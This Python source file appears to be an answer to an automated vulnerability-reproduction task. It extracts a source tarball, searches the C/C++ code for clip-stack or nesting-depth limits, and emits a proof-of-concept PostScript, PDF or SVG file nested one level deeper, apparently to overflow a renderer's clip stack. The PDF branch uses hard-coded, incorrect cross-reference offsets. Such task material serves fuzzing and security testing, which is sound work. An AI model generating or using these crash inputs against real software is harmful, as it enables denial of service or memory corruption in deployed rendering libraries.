import os
import re
import tarfile
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        extract_dir = 'tmp_extract'
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)
        with tarfile.open(src_path, 'r:*') as tar:
            tar.extractall(extract_dir)

        max_depth = 32
        patterns = [
            r'(max_?clip_?depth|clip_?stack_?size|nesting_?depth|clip_?nesting_?depth)\s*[=:]\s*(\d+)',
            r'#define\s+(MAX_?CLIP_?DEPTH|CLIP_?STACK_?SIZE)\s+(\d+)',
            r'const\s+(int|size_t)\s+\w+\s*=\s*(\d+);?\s*//\s*clip',
        ]
        for root, _, files in os.walk(extract_dir):
            for file in files:
                if file.endswith(('.c', '.cc', '.cpp', '.h', '.hpp')):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read().lower()
                            if any(term in content for term in ['clip mark', 'nesting depth', 'clip stack', 'layer stack']):
                                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                                    content = f.read()
                                for pat in patterns:
                                    matches = re.finditer(pat, content, re.IGNORECASE)
                                    for match in matches:
                                        try:
                                            cand = int(match.group(2))
                                            if 1 < cand < 10000:
                                                max_depth = max(max_depth, cand)
                                        except ValueError:
                                            pass
                    except Exception:
                        pass

        fuzzer_format = 'svg'
        for root, _, files in os.walk(extract_dir):
            for file in files:
                if 'fuzz' in file.lower() and file.endswith('.cc'):
                    filepath = os.path.join(root, file)
                    try:
                        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read().lower()
                            if 'pdf' in content:
                                fuzzer_format = 'pdf'
                            elif 'postscript' in content or 'ps' in content:
                                fuzzer_format = 'ps'
                            elif 'svg' in content:
                                fuzzer_format = 'svg'
                    except Exception:
                        pass
                    break

        N = max_depth + 1

        if fuzzer_format == 'ps':
            poc_lines = ['%!PS-Adobe-3.0']
            for _ in range(N):
                poc_lines.append('newpath 0 0 1 1 rectclip')
            poc_lines.append('showpage')
            poc = '\n'.join(poc_lines).encode('ascii')
        elif fuzzer_format == 'pdf':
            # Simple PDF with nested q/W for clipping
            stream_content = 'q\n' * N
            stream_content += '0 0 1 1 re W n\n'
            stream_content += 'BT /F1 12 Tf 10 10 Td (POC) Tj ET\n'
            stream_content += 'Q\n' * N
            stream_len = len(stream_content)
            pdf = f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj
4 0 obj<</Length {stream_len}>>stream
{stream_content}
endstream endobj
xref
0 5
0000000000 65535 f 
0000000010 00000 n 
0000000077 00000 n 
0000000178 00000 n 
0000000255 00000 n 
trailer<</Size 5/Root 1 0 R>>
startxref
400
%%EOF
""".encode('ascii')
            poc = pdf
        else:  # svg
            clip_defs = ''
            for i in range(N):
                clip_defs += f'<clipPath id="c{i}"><rect x="0" y="0" width="100" height="100"/></clipPath>\n'
            nested_g_open = ''
            for i in range(N):
                nested_g_open += f'<g clip-path="url(#c{i})">\n'
            nested_g_close = '</g>\n' * N
            inner = '<rect x="10" y="10" width="80" height="80" fill="blue"/>\n'
            svg_content = f'''<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
<defs>{clip_defs}</defs>
{nested_g_open}{inner}{nested_g_close}</svg>'''
            poc = svg_content.encode('utf-8')

        shutil.rmtree(extract_dir)
        return poc
